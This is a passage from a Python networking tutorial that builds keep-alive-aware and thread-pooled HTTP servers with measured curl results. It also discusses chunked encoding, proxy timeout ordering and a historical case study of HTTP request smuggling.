        return False
    if version == "HTTP/1.1":
        return True
    return conn_header == "keep-alive"
```

The second half of the framing story is what makes reusing a connection *safe* rather than corrupting: the reader must know, for certain, where response N ends and response N+1 begins, using exactly the same tools as concept 1's request framing — a `Content-Length` header on the response (which this server always sends, since it builds the whole body in memory before replying) tells the client precisely how many bytes belong to this response, so it can go right back to looking for the next status line immediately afterward, on the same socket, without a new handshake.

### Runnable example — a keep-alive-aware server, and proof of reuse

```python
# keepalive_server.py -- same iterative server, now HTTP/1.1 keep-alive aware.
# Still ONE connection at a time overall (concept 4 adds concurrency), but ONE
# connection can now carry MANY requests before the socket closes.
# stdlib only. Run:  python keepalive_server.py
import json
import os
import socket
import time

HOST, PORT = "127.0.0.1", 8080
STATIC_DIR = os.path.join(os.path.dirname(__file__), "static")
MAX_HEADER_BYTES = 16 * 1024
KEEPALIVE_TIMEOUT = 5.0          # seconds of silence before we hang up -- concept 6

os.makedirs(STATIC_DIR, exist_ok=True)
with open(os.path.join(STATIC_DIR, "hello.txt"), "w") as f:
    f.write("hello from the static directory\n")


def recv_request(conn: socket.socket):
    buf = b""
    while b"\r\n\r\n" not in buf:
        chunk = conn.recv(4096)
        if not chunk:
            return None
        buf += chunk
        if len(buf) > MAX_HEADER_BYTES:
            raise ValueError("request header too large")
    head, _, body = buf.partition(b"\r\n\r\n")
    lines = head.split(b"\r\n")
    method, path, version = lines[0].decode("latin-1").split(" ")
    headers = {}
    for line in lines[1:]:
        name, _, value = line.decode("latin-1").partition(":")
        headers[name.strip().lower()] = value.strip()
    content_length = int(headers.get("content-length", 0))
    while len(body) < content_length:
        chunk = conn.recv(4096)
        if not chunk:
            break
        body += chunk
    return method, path, version, headers, body


def wants_keep_alive(version: str, headers: dict) -> bool:
    conn_header = headers.get("connection", "").lower()
    if conn_header == "close":
        return False
    if version == "HTTP/1.1":
        return True
    return conn_header == "keep-alive"


def build_response(status: int, reason: str, body: bytes, content_type: str, keep_alive: bool):
    headers = [
        f"HTTP/1.1 {status} {reason}",
        f"Content-Type: {content_type}",
        f"Content-Length: {len(body)}",
        f"Connection: {'keep-alive' if keep_alive else 'close'}",
    ]
    if keep_alive:
        headers.append(f"Keep-Alive: timeout={int(KEEPALIVE_TIMEOUT)}")
    head = "\r\n".join(headers) + "\r\n\r\n"
    return head.encode("latin-1") + body


def route(method: str, path: str, keep_alive: bool):
    if method == "GET" and path == "/api/time":
        payload = json.dumps({"utc": time.time(), "pid": os.getpid()}).encode()
        return build_response(200, "OK", payload, "application/json", keep_alive)
    if method == "GET" and path == "/api/slow":
        time.sleep(1.0)
        payload = json.dumps({"slept": 1.0, "pid": os.getpid()}).encode()
        return build_response(200, "OK", payload, "application/json", keep_alive)
    if method == "GET" and path.startswith("/static/"):
        requested = os.path.normpath(os.path.join(STATIC_DIR, path[len("/static/"):]))
        if not requested.startswith(os.path.abspath(STATIC_DIR)):
            return build_response(403, "Forbidden", b"forbidden\n", "text/plain", keep_alive)
        if not os.path.isfile(requested):
            return build_response(404, "Not Found", b"not found\n", "text/plain", keep_alive)
        with open(requested, "rb") as f:
            data = f.read()
        return build_response(200, "OK", data, "text/plain", keep_alive)
    return build_response(404, "Not Found", b"not found\n", "text/plain", keep_alive)


def handle_client(conn: socket.socket, addr):
    conn.settimeout(KEEPALIVE_TIMEOUT)
    requests_served = 0
    try:
        while True:                              # <-- THE new part: loop, don't return
            try:
                parsed = recv_request(conn)
            except socket.timeout:
                print(f"  [{addr}] idle {KEEPALIVE_TIMEOUT}s with no new request -- closing")
                return
            if parsed is None:
                return                            # client closed its side
            method, path, version, headers, body = parsed
            keep = wants_keep_alive(version, headers)
            print(f"  [{addr}] {method} {path} {version}  keep_alive={keep}  "
                  f"(request #{requests_served + 1} on this connection)")
            conn.sendall(route(method, path, keep))
            requests_served += 1
            if not keep:
                return
    finally:
        conn.close()
        print(f"  [{addr}] connection closed after {requests_served} request(s)")


def serve_forever():
    lsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    lsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    lsock.bind((HOST, PORT))
    lsock.listen(128)
    print(f"keep-alive-aware server on http://{HOST}:{PORT}  (pid {os.getpid()})")
    while True:
        conn, addr = lsock.accept()
        handle_client(conn, addr)


if __name__ == "__main__":
    serve_forever()
```

Real, measured behavior. First, proof of reuse — `curl` given two URLs for the same host in one invocation reuses its connection:

```
$ curl -s http://127.0.0.1:8080/api/time http://127.0.0.1:8080/static/hello.txt
{"utc": 1787570079.0809765, "pid": 26908}hello from the static directory
```

Server-side log for that single `curl` invocation:

```
  [('127.0.0.1', 64164)] GET /api/time HTTP/1.1  keep_alive=True  (request #1 on this connection)
  [('127.0.0.1', 64164)] GET /static/hello.txt HTTP/1.1  keep_alive=True  (request #2 on this connection)
  [('127.0.0.1', 64164)] connection closed after 2 request(s)
```

**One source port (`64164`), two requests.** That's the entire proof: no second handshake happened, because none was needed — both requests travelled the same already-open socket. The connection closes only at the very end, and only because `curl` itself, having nothing left to ask for, closed its side.

Second, proof that the idle-close path actually fires, and fires on schedule — a raw request sent and then left open with no follow-up:

```
$ time (exec 3<>/dev/tcp/127.0.0.1/8080; printf 'GET /api/time HTTP/1.1\r\nHost: x\r\n\r\n' >&3; cat <&3; exec 3<&-)
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 41
Connection: keep-alive
Keep-Alive: timeout=5

{"utc": 1787570091.2581038, "pid": 26908}

real    0m5.019s
```

**`5.019s`, against a configured `KEEPALIVE_TIMEOUT` of `5.0` — measured, not estimated.** `conn.settimeout(KEEPALIVE_TIMEOUT)` makes every subsequent blocking call on that socket (including the `recv()` inside `recv_request`) raise `socket.timeout` if it doesn't complete within that window. Since nothing more was sent after the first response, the *second* call to `recv_request` blocks in `recv()`, times out at almost exactly 5 seconds, and `handle_client` catches `socket.timeout` and closes the connection — which is exactly why `cat <&3` (reading everything until EOF) finally returns at that moment.

**Why this works, line by line.**

- `conn.settimeout(KEEPALIVE_TIMEOUT)` is doing two jobs at once, and it's worth being precise about which: it bounds how long *any single* `recv()` call may block, which means it bounds both "how long we'll wait for a followup request on an idle connection" (the keep-alive case just measured) *and*, incidentally, "how long we'll wait mid-request for more header bytes to arrive" — the second of those is concept 6's business, but note the mechanism is identical; a socket timeout doesn't know or care *why* you're waiting, only that you've been waiting too long.
- The `while True:` loop around `recv_request` is the entire keep-alive feature. Everything else in this file is either identical to concept 1 or exists to compute the `keep` flag and put the right `Connection` header on the wire so the *client's* parser also knows to expect another response rather than treat the connection as finished.
- `requests_served` and the closing log line exist purely so you can *see* the reuse happening — they carry no protocol meaning, but they're what produced the "request #1 / request #2" evidence above.

### Under the hood

Nothing new is happening at the socket-call level — this section is a pure control-flow change (a `while True:` wrapped around work that concept 1 already did once) plus a small amount of header bookkeeping. The interesting mechanism lives one layer up, in *why* this is cheaper: reusing a connection means Day 11's TCP slow-start congestion window (the mechanism that makes a brand-new TCP connection start by sending only a few packets before waiting for acknowledgment, then gradually sending more) never has to reset between requests to the same server — a connection that's already been sending data for a while has a *larger* window and can push more bytes per round trip than a fresh one, which is a second, independent reason keep-alive helps beyond just skipping the handshake. This is exactly why browsers, and this server's own `Keep-Alive: timeout=5` response header (a non-normative but widely honored convention, distinct from the normative `Connection` header, that tells a client roughly how long the server intends to hold the socket open so the client can decide whether it's worth waiting versus opening a fresh one), try hard to keep a small number of connections alive and busy rather than opening a new one per request.

**Deliberate stop.** I'm not opening TCP slow-start's window-growth algorithm itself here — that's outside today's scope and is a Day 11-adjacent detail; the load-bearing fact for today is just that reuse is cheaper for more than one reason, which is why every real HTTP client and server defaults to it.

### System design — tuning keep-alive timeouts across a proxy chain

**Problem.** Your app server (this section's code, or a real one) sits behind Nginx (Day 16), which sits behind a cloud load balancer. Each hop terminates its own TCP connection and re-opens a new one to the next hop — the load balancer holds a connection to Nginx, and Nginx holds a *separate* connection to your app server. Three independent keep-alive timeouts now exist in one request path. What happens if they disagree?

**Requirements.** No client should ever see a connection silently die mid-request; idle connections at every hop should eventually free their resources; the whole chain should behave predictably under both light and heavy load.

**The realistic alternative, and the actual failure it causes.** Set every hop's timeout independently, "whatever the framework defaults to," without coordinating them. This is extremely common and is precisely the setup behind one of the most frequently rediscovered production incidents in web infrastructure: if the **upstream** hop (Nginx → app server, or load balancer → Nginx) has a *longer* keep-alive timeout than the **downstream** hop expects, the downstream side can close an idle connection at exactly the moment the upstream side chooses to reuse it for a new request — the new request is written onto a socket the other end already considers dead, and the result is a connection-reset error surfacing as a `502 Bad Gateway`, intermittently, under exactly the traffic pattern (moderate, bursty, with idle gaps) that makes it hardest to reproduce on demand. This isn't hypothetical: AWS's own Application Load Balancer troubleshooting documentation explicitly warns that the ALB's idle timeout must be configured *shorter* than the keep-alive timeout of whatever it's proxying to, specifically to avoid this class of intermittent `502`.

**The decision.** Set every hop's idle/keep-alive timeout so that **timeouts get strictly shorter as you move downstream, toward the origin** — the load balancer's client-facing timeout should be longest, Nginx's timeout to your app server should be shorter than Nginx's timeout to the load balancer, and so on. That ordering guarantees the *upstream* side (closer to the load balancer) always gives up on an idle connection before the *downstream* side (closer to your app) would, so an upstream hop never tries to reuse a connection the downstream hop has already silently closed.

**The trade-off.** Shorter downstream timeouts mean *more* connection churn between your proxy and your app server under bursty traffic with gaps — you pay slightly more of the handshake cost this whole section exists to avoid, in exchange for eliminating an entire class of intermittent, hard-to-reproduce `502`s.

**The flip condition.** If your app server's own connection-acceptance cost is unusually high (a very expensive per-connection setup — e.g., a TLS handshake terminated at the app layer rather than at the proxy, Day 14), the calculus can shift toward keeping downstream connections alive longer and instead adding *application-level* retry-on-reset logic at the proxy layer (Nginx's `proxy_next_upstream` and connection-retry directives exist for exactly this). That's a real, more complex alternative — accept that a reused connection can occasionally race a close, and retry the request on the next attempt rather than eliminating the race — and it's the right call once eliminating connection churn matters more than eliminating this specific failure mode outright.

**Failure modes.** Beyond the `502` pattern above: a keep-alive timeout set far *longer* than necessary at any hop means idle-but-open connections sit around consuming a file descriptor and a small amount of memory each (concept 4 and concept 5 make this cost concrete) for no benefit — under a connection-limited proxy (Nginx's `worker_connections`, Day 16), that's capacity being wasted on idle sockets that could be serving new traffic.

A second, distinct design question for this concept — whether to support **HTTP pipelining** (sending multiple requests back-to-back on one connection *without* waiting for each response before sending the next, as the HTTP/1.1 spec technically allows) — is a real historical decision, but it resolves the same way everywhere it's been tried: nearly every browser and server disables it. The reason is head-of-line blocking at the application layer — if request 1 is slow, its response must still be sent *before* request 2's response even if request 2 finished first (responses must arrive in the same order requests were sent, per RFC 9112 §9.4), so one slow request stalls every response behind it on that connection, and worse, several real-world middleboxes and servers were found to handle pipelined requests incorrectly, causing response corruption. HTTP/2 (Day 14) solves the same underlying goal — many requests in flight on one connection — properly, with true multiplexing and independent per-stream framing instead of a single ordered queue, which is why pipelining was effectively abandoned rather than fixed.

### In production

**Best practices.** Always send an explicit `Connection` header rather than relying purely on version defaults, particularly on error responses (RFC 9112 recommends closing after certain classes of error, since the connection's state may be unrecoverable). Set an idle-read timeout on every persistent connection — an idle connection with no timeout is a resource leak waiting for a reason to happen (concept 6). Coordinate timeout values across every hop in a proxy chain per this section's system design.

**Common mistakes, beginner → senior.** *Beginner:* forgetting `Connection: close` responses still need a correct `Content-Length` (some frameworks default to closing precisely so they *don't* have to compute a length — chunked encoding, concept 3, is the other way out). *Intermediate:* setting a keep-alive timeout to a large, "safe-feeling" number (60s, 300s) without considering how many idle connections that allows to accumulate under load — see concept 4's thread-pool-exhaustion system design for exactly this arithmetic. *Senior:* the proxy-chain timeout-ordering mistake in this section's system design, which is common enough that cloud providers document it explicitly rather than assuming operators will independently rediscover it.

**Observability.** Track connections-per-request (a value near 1 means keep-alive isn't working — check both client and server `Connection` header handling); track connection lifetime distribution (a spike of very-short-lived connections downstream of a proxy is the timeout-mismatch symptom from this section's system design).

---

## 3. Chunked transfer-encoding, and the framing we didn't implement

**Depth: [AWARE]**

Every response in this note's servers computes its full body in memory first, then sends one `Content-Length` header describing its exact size. That works perfectly for a JSON payload or a static file, where the size is known before the first byte goes out. It fails for anything **generated incrementally** — a response streamed from a slow upstream, a long-running export, a server-sent-events feed — where the total size genuinely isn't known when the headers must be sent.

RFC 9112 §7.1 solves this with **chunked transfer-encoding**: instead of one `Content-Length` header, the response carries `Transfer-Encoding: chunked`, and the body is sent as a series of self-describing pieces, each prefixed by its own length in hexadecimal, terminated by a zero-length chunk:

```
HTTP/1.1 200 OK
Transfer-Encoding: chunked

7\r\n
Mozilla\r\n
9\r\n
Developer\r\n
0\r\n
\r\n
```

Read that literally: `7\r\n` says "the next 7 bytes are chunk data," those 7 bytes are `Mozilla`, then another length-prefixed chunk (`9` → `Developer`), then a chunk of length `0`, which is the universal "no more chunks" terminator. The framing question this note has answered every other way — "how does the reader know where the message ends?" — is answered here by the data carrying its own length markers throughout, rather than one length declared up front.

**The honest gap: this note's servers implement none of this.** `recv_request` and `try_parse_request` in every version below only understand `Content-Length` framing. A client that sends a request body with `Transfer-Encoding: chunked` instead of `Content-Length` will be misparsed by every server in this note — the `content_length = int(headers.get("content-length", 0))` line will silently compute `0`, and the actual chunk-encoded body bytes will be left sitting unread in the socket buffer, corrupting the framing of whatever the client sends next on that connection. A real server must implement a chunked-body decoder to be RFC 9112 compliant; that decoder is a genuinely separate, non-trivial state machine (tracking "expecting a length line" vs. "reading N bytes of chunk data" vs. "expecting the trailing CRLF after a chunk") and building it here would be exactly the kind of code added to satisfy a checklist rather than to teach something new — the state-machine-over-a-byte-stream pattern is already fully taught by concept 1's header-framing loop and concept 5's incremental `try_parse_request`. Treat chunked-body parsing as a black box you now know exists and know the shape of, and reach for a real parsing library (this note's concept 1 system design) the moment you need it correctly implemented.

### Case study — HTTP request smuggling: what happens when two parsers disagree

**What happened, and why it's about exactly this ambiguity.** In 2005, researchers at Watchfire (Chaim Linhart, Amit Klein, Ronen Heled, and Steve Orrin) published "HTTP Request Smuggling," describing an attack class that exploits precisely the framing question this section is about: a request can, in principle, carry *both* a `Content-Length` header and a `Transfer-Encoding: chunked` header, and RFC 9112 §6.3 explicitly requires that when both are present and the message isn't from a trusted source, the recipient must reject it or resolve the ambiguity in a specific, safe way — because a front-end proxy and a back-end server, written by different teams with different parsing code, can disagree about which header wins. If the front end frames the request using `Content-Length` while the back end frames it using `Transfer-Encoding`, an attacker can craft a single HTTP request that the front end sees as one complete message but the back end sees as *two* — the second, smuggled "request" gets prepended onto whatever the *next* legitimate client's request turns out to be, once the connection is reused (this is precisely why the vulnerability depends on keep-alive connection reuse, this note's concept 2). The attack was substantially revived and generalized in 2019 by James Kettle (PortSwigger), whose "HTTP Desync Attacks" research (presented at DEF CON 27 and Black Hat USA 2019) found and responsibly disclosed real, exploitable smuggling vulnerabilities in production infrastructure at multiple major websites, netting significant bug-bounty payouts and prompting several CDN and proxy vendors to ship hardening changes.

**The engineering lesson.** Framing ambiguity between two independently-written parsers sharing one connection is not a theoretical concern — it is a recurring, actively-exploited vulnerability class, and its root cause is structurally identical to concept 1's Cloudbleed case study: untrusted input being interpreted differently by two pieces of code that were each individually "correct" against their own narrower understanding of the spec. The mitigation, per RFC 9112 §6.3, is exactly the kind of unglamorous specificity a real parsing library encodes and a hand-rolled one is likely to miss: when both `Content-Length` and `Transfer-Encoding` appear, or when `Transfer-Encoding` appears with a value the parser doesn't recognize, the message must be treated as invalid and the connection closed — never silently guessed at.

**Primary sources.** RFC 9112, §6.3 ("Message Body Length") and §11.2 ("Request Splitting"); Linhart, Klein, Heled, Orrin, "HTTP Request Smuggling" (Watchfire whitepaper, 2005); James Kettle, "HTTP Desync Attacks: Request Smuggling Reborn" (PortSwigger Research, 2019). *Verify current: PortSwigger's own "HTTP request smuggling" web security academy page is regularly updated with newly discovered variants and is the best source for the current state of the art.*

---

## 4. Concurrency model I — thread-per-connection

**Depth: [CORE]**

### Intuition

Concept 1's worked example proved something uncomfortable: in the iterative model, the gap between two `accept()` calls is exactly as long as the previous client took, *no matter what that client was doing* — computing, waiting on a slow disk, or (concept 1's demo) just sitting there sending nothing at all. The fix that occurs to almost everyone the moment they see that demo is: **stop making everyone wait on the same worker.** Give each accepted connection its own thread, and let the operating system's scheduler (Day 3 §1.5) sort out who actually runs when. This is **thread-per-connection**, and it is the single most natural next step — natural enough that it was the dominant server architecture on the early web (classic Apache's `prefork`/`worker` MPMs, one process or thread per connection) before anyone had a reason to think harder about it.

The appeal is real and worth stating plainly before the rest of this section complicates it: the code barely changes. `handle_client` — concept 2's exact function, framing loop and all — doesn't need to know it's now running on a dedicated thread rather than the main one. Every line of "read a request, route it, write a response, loop for keep-alive" logic this note has built so far is reused *completely unmodified*. The only new code is what wraps around it: instead of calling `handle_client(conn, addr)` directly in the accept loop and waiting for it to return, hand it to a new thread and go straight back to `accept()`.

### Analogy — hiring more clerks

Concept 1's single ticket window becomes a bank of windows, each staffed by its own clerk, and the moment you walk in you're assigned an open one. A slow visitor at window 3 no longer holds up windows 1, 2, and 4 — they proceed independently, exactly as Day 3 §1.1's "cooks in one kitchen" analogy already established: multiple threads inside one process, each with its own private stack and instruction pointer, sharing the same address space.

**Where the analogy breaks:** hiring a clerk in real life costs a salary and takes a while to arrange; hiring a *thread* costs an 8MB reserved stack and a `clone(2)` syscall (Day 3 §1.1, §1.6) — orders of magnitude cheaper than a human hire, but **not free**, and critically, **not something you'd do without limit**. A bank that hired one new clerk for every single customer who ever walked through the door, and never let a clerk go, would eventually have more clerks than floor space. That's exactly Day 3 §1.6's C10K problem, and it's about to reappear here in a very concrete, measured form.

### Runnable example — the threaded upgrade, bounded and unbounded

```python
# threaded_server.py -- same server, now one thread PER CONNECTION.
# Two variants: unbounded threading.Thread (naive, dangerous) and a bounded
# ThreadPoolExecutor (the production-shaped fix). stdlib only.
# Cross-reference: Day 3 sec 1.1 (what a thread is), sec 1.6 (the C10K wall),
# sec 1.7 (Little's Law sizing) -- none of that is re-derived here.
import json, os, socket, threading, time, sys
from concurrent.futures import ThreadPoolExecutor

HOST, PORT = "127.0.0.1", 8080
STATIC_DIR = os.path.join(os.path.dirname(__file__), "static")
MAX_HEADER_BYTES = 16 * 1024
KEEPALIVE_TIMEOUT = 5.0
POOL_SIZE = 8

os.makedirs(STATIC_DIR, exist_ok=True)
with open(os.path.join(STATIC_DIR, "hello.txt"), "w") as f:
    f.write("hello from the static directory\n")


def recv_request(conn):
    buf = b""
    while b"\r\n\r\n" not in buf:
        chunk = conn.recv(4096)
        if not chunk:
            return None
        buf += chunk
        if len(buf) > MAX_HEADER_BYTES:
            raise ValueError("request header too large")
    head, _, body = buf.partition(b"\r\n\r\n")
    lines = head.split(b"\r\n")
    method, path, version = lines[0].decode("latin-1").split(" ")
    headers = {}
    for line in lines[1:]:
        name, _, value = line.decode("latin-1").partition(":")
        headers[name.strip().lower()] = value.strip()
    content_length = int(headers.get("content-length", 0))
    while len(body) < content_length:
        chunk = conn.recv(4096)
        if not chunk:
            break
        body += chunk
    return method, path, version, headers, body


def wants_keep_alive(version, headers):
    conn_header = headers.get("connection", "").lower()
    if conn_header == "close":
        return False
    return True if version == "HTTP/1.1" else conn_header == "keep-alive"


def build_response(status, reason, body, content_type, keep_alive):
    headers = [
        f"HTTP/1.1 {status} {reason}",
        f"Content-Type: {content_type}",
        f"Content-Length: {len(body)}",
        f"Connection: {'keep-alive' if keep_alive else 'close'}",
    ]
    return ("\r\n".join(headers) + "\r\n\r\n").encode("latin-1") + body


def route(method, path, keep_alive):
    if method == "GET" and path == "/api/time":
        payload = json.dumps({"utc": time.time(), "thread": threading.current_thread().name}).encode()
        return build_response(200, "OK", payload, "application/json", keep_alive)
    if method == "GET" and path == "/api/slow":
        time.sleep(1.0)                     # an I/O-bound handler stand-in
        payload = json.dumps({"slept": 1.0, "thread": threading.current_thread().name}).encode()
        return build_response(200, "OK", payload, "application/json", keep_alive)
    if method == "GET" and path.startswith("/static/"):
        requested = os.path.normpath(os.path.join(STATIC_DIR, path[len("/static/"):]))
        if not requested.startswith(os.path.abspath(STATIC_DIR)):
            return build_response(403, "Forbidden", b"forbidden\n", "text/plain", keep_alive)
        if not os.path.isfile(requested):
            return build_response(404, "Not Found", b"not found\n", "text/plain", keep_alive)
        with open(requested, "rb") as f:
            data = f.read()
        return build_response(200, "OK", data, "text/plain", keep_alive)
    return build_response(404, "Not Found", b"not found\n", "text/plain", keep_alive)


def handle_client(conn, addr):
    conn.settimeout(KEEPALIVE_TIMEOUT)
    requests_served = 0
    try:
        while True:
            try:
                parsed = recv_request(conn)
            except socket.timeout:
                return
            if parsed is None:
                return
            method, path, version, headers, body = parsed
            keep = wants_keep_alive(version, headers)
            conn.sendall(route(method, path, keep))
            requests_served += 1
            if not keep:
                return
    finally:
        conn.close()


def serve_forever_unbounded():
    """DANGEROUS demo-only variant: one new OS thread per accepted connection,
    with NO cap. This is Day 3 sec 1.6's C10K collapse waiting to happen --
    kept here only to prove the point below."""
    lsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    lsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    lsock.bind((HOST, PORT)); lsock.listen(128)
    print(f"UNBOUNDED threaded server on http://{HOST}:{PORT}  (pid {os.getpid()})")
    while True:
        conn, addr = lsock.accept()
        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()


def serve_forever_pooled():
    """Production-shaped variant: a BOUNDED pool. Once POOL_SIZE connections are
    being served, the next accept()ed connection's handler is QUEUED by the
    executor -- it still holds a socket and a file descriptor, but its bytes
    sit unread until a worker frees up. Backpressure, not collapse."""
    lsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    lsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    lsock.bind((HOST, PORT)); lsock.listen(128)
    print(f"POOLED ({POOL_SIZE} threads) server on http://{HOST}:{PORT}  (pid {os.getpid()})")
    with ThreadPoolExecutor(max_workers=POOL_SIZE, thread_name_prefix="conn") as pool:
        while True:
            conn, addr = lsock.accept()
            pool.submit(handle_client, conn, addr)


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "unbounded":
        serve_forever_unbounded()
    else:
        serve_forever_pooled()
```

Real, measured proof that this actually buys concurrency — five simultaneous requests to `/api/slow` (each of which does a genuine 1-second `time.sleep`), fired at the same instant against the **pooled** server:

```
$ time ( for i in 1 2 3 4 5; do curl -s http://127.0.0.1:8080/api/slow & done; wait )
{"slept": 1.0, "thread": "conn_0"}{"slept": 1.0, "thread": "conn_1"}{"slept": 1.0, "thread": "conn_2"}{"slept": 1.0, "thread": "conn_3"}{"slept": 1.0, "thread": "conn_4"}

real    0m1.389s
```

**Five requests, each individually taking a full second, completed in 1.389 seconds total — and five *different* thread names served them.** Compare this to the exact same test against the **iterative** server from concept 1:

```
$ time ( for i in 1 2 3 4 5; do curl -s http://127.0.0.1:8080/api/slow & done; wait )
{"slept": 1.0, "pid": 1700}{"slept": 1.0, "pid": 1700}{"slept": 1.0, "pid": 1700}{"slept": 1.0, "pid": 1700}{"slept": 1.0, "pid": 1700}

real    0m5.181s
```

**Same five requests, same server logic, one process id every time (proving serial handling), and 5.181 seconds — almost exactly 5× the threaded version's time**, because each request's full second of sleeping happened one after another rather than overlapping. That ratio is the entire value proposition of thread-per-connection, measured rather than asserted.

Now push past the pool's capacity — ten simultaneous `/api/slow` requests against a pool sized for eight concurrent workers:

```
$ time ( for i in $(seq 1 10); do curl -s http://127.0.0.1:8080/api/slow & done; wait )
... (ten replies, thread names conn_0 through conn_7 appearing TWICE each) ...

real    0m2.842s
```

**Eight requests run in the first wave (≈1s), the remaining two queue and run in a second wave once a worker frees up (≈another 1s), for a real measured total of 2.842s** — visibly two batches, not five and not one. This is Little's Law (Day 3 §1.7) made physical: with `POOL_SIZE = 8` and ten roughly-simultaneous one-second jobs arriving, the pool can only run eight at once, so the last two *must* wait for the first batch to finish, no matter how the code is written.

**Why this works, line by line.**

- `handle_client` is **completely unchanged from concept 2**. That's the whole point of this section — concurrency was added entirely in the two `serve_forever_*` functions, without touching a single line of the request-framing, keep-alive, or routing logic. The layering this note has built request-by-request pays off directly here.
- `threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()` in the unbounded variant is exactly Day 3 §1.1's `clone(2)`-backed thread creation, applied to a live connection. `daemon=True` means these threads won't prevent the process from exiting — a demo convenience, and also a reminder that nothing here tracks or bounds how many are alive at once.
- `ThreadPoolExecutor(max_workers=POOL_SIZE, thread_name_prefix="conn")` is where the real engineering decision lives: a fixed-size pool of reusable threads, fed via an internal, unbounded work queue. `pool.submit(handle_client, conn, addr)` hands the already-*accepted* connection to that queue; if all `POOL_SIZE` threads are busy, the submitted job simply waits in the executor's queue — the connection's socket stays open and its bytes stay unread, but no *new* thread is created and no memory-per-thread cost is paid for the excess. `thread_name_prefix="conn"` is purely for this demo's benefit — printing `threading.current_thread().name` in the response body is how we could *prove*, externally, that five different physical threads served five concurrent requests, rather than taking it on faith.

**Under the hood.** Every cost this concurrency model incurs was already measured in Day 3: an 8MB reserved stack per thread (§1.1, §1.6), a `clone(2)` syscall to create one, and — the part that matters most once many threads exist simultaneously — a context switch every time the scheduler moves the CPU from one thread to another, at roughly 1–10µs each *plus* the hidden cost of a cold cache for the thread that just got switched in (§1.5). None of that is re-derived here; it's the same cost, applied to a socket instead of an abstract "thread doing work."

**Deliberate stop.** I'm not re-deriving why a context switch costs what it costs, or why 10,000 threads collapse a machine — that is Day 3 §1.5 and §1.6 in full, and today's job is applying that already-built understanding to a concrete server, not re-teaching it.

### System design — bounding an unbounded accept-and-spawn loop

**Problem.** You've written `serve_forever_unbounded()` above and shipped it. Traffic is normally light. One day a marketing email goes out and 5,000 clients connect within a few seconds. What happens, and what do you actually change?

**Requirements.** The server must degrade *predictably* under a burst rather than catastrophically; legitimate traffic should experience worse latency under load, not a crash; the fix shouldn't require predicting traffic volume perfectly in advance.

**The realistic alternatives.** (1) Leave it unbounded and hope traffic never spikes. (2) A fixed-size `ThreadPoolExecutor`, as built above. (3) A semaphore-gated raw-thread version, where a counting semaphore (Day 3's synchronization-primitives family, `threading.Semaphore`) is acquired before spawning a thread and released when it exits, capping concurrent threads without the executor's internal queue.

**The decision, and the actual reason.** A bounded `ThreadPoolExecutor` (option 2), because the failure mode of option 1 is exactly Day 3 §1.6's C10K collapse: 5,000 threads means roughly 5,000 × 8MB of reserved stack address space, a scheduler juggling 5,000 runnable/blocked entities, and — because most of those 5,000 connections are mostly *idle* between the handshake and their first byte of actual request data — almost all of that cost is being spent representing "a connection that's currently waiting," which Day 3 explicitly identifies as the wasteful case an event loop (concept 5) exists to fix cheaply. A fixed pool converts "the server might run out of memory and die" into "requests beyond capacity wait a bounded amount of time in a queue" — a strictly better failure mode, because it's *visible* (queue depth, wait time) rather than catastrophic.

**The trade-off, honestly.** A bounded pool doesn't bound the number of *accepted* connections, only the number of *threads actively working* — as this section's ten-vs-eight measurement showed, the extra two connections still held open sockets and file descriptors while queued. A large enough burst can still exhaust file descriptors (`RLIMIT_NOFILE`, Day 5) even with a perfectly-sized thread pool, because `accept()` itself keeps succeeding regardless of pool saturation. Genuinely bounding *that* requires an additional cap — tracking an active-connection counter and skipping the call to `accept()` entirely once at capacity, so excess connections queue in the *kernel's* backlog (Day 11 §4) rather than in your own process's file descriptor table.

**The flip condition.** Size the pool using Day 3 §1.7's Little's Law with *this server's* real numbers, not a round number picked by feel: if `/api/slow`-shaped work arrives at rate λ and takes W seconds in service, you need `L = λ × W` concurrent workers. At `λ = 20 req/s` and `W = 1s` (this section's `/api/slow`), that's `L = 20` — a pool of 8 would already be undersized for that steady-state load, queuing constantly even with no burst at all; the pool of 8 used above is deliberately sized *below* the ten-request burst specifically to make the queuing behavior visible in a short demo. In a real deployment, compute `L` from your actual traffic and add headroom for variance, exactly as Day 3 §1.7 does for a generic API server.

### System design — thread-per-connection meets keep-alive: the idle-thread tax

**Problem.** Concept 2 added keep-alive. Combine it with this section's thread-per-connection model: what does a browser that opens a connection and then sits idle for ten seconds between clicks actually cost the server?

**Requirements.** Serve genuinely active requests promptly; don't let idle-but-connected clients silently consume capacity meant for active ones.

**The realistic alternative and why it looked fine before today.** Before keep-alive was standard, thread-per-connection's cost was bounded by how quickly requests were *processed* — a thread existed only for the (typically short) duration of one request-response cycle, so even a very popular server didn't accumulate that many simultaneously-alive threads unless it was genuinely handling that many simultaneous *requests*. Keep-alive breaks that assumption completely: a thread is now held for the entire *lifetime of the connection*, including all the time between requests when the client is doing nothing at all — reading a page, thinking, idling in a background browser tab. **A server with 2,000 users who each load a page and then idle for 30 seconds now needs up to 2,000 threads simultaneously parked in `recv()`, not the handful that would have been "in flight" processing an actual request at any instant.**

**The decision.** This exact interaction — persistent connections turning "idle" into the *common* case rather than the exception — is the actual historical reason thread/process-per-connection servers (classic Apache) became a scaling headache once keep-alive was standardized in HTTP/1.1 (1997), and it is *the* reason the industry moved toward event-driven architectures (concept 5) specifically for connection-heavy, keep-alive-heavy workloads, rather than for CPU-bound ones. The number to hold onto: **your required thread count under thread-per-connection is no longer bounded by your request rate — it's bounded by your concurrently-open-connection count**, which for a busy consumer-facing site can be one to two orders of magnitude larger than the number of requests actually being processed at any instant.

**The trade-off.** You could keep thread-per-connection and simply set a short keep-alive timeout (concept 2's `KEEPALIVE_TIMEOUT`) to bound how long an idle thread sticks around — this genuinely helps, but it doesn't eliminate the cost, it only caps its duration, and a short timeout increases the *rate* of new-connection churn (trading the idle-thread cost for more frequent handshake cost, concept 2's whole motivation for keep-alive in the first place).

